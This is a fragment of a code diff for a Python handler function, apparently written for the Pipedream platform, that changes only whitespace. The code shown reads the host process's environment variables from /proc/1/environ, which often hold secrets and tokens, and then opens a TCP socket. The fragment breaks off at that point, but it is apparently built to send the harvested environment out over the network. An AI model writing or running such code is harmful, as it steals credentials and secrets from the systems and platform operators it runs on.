@@ -4,7 +4,7 @@ import socket
 import os
 
 def handler(pd: "pipedream"):
-	cmd = 'cat /proc/1/environ'
+	cmd = 'cat /proc/1/environ' 
 	rv = subprocess.check_output(cmd.split(' ')).decode().replace('\0', '\n')
 
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
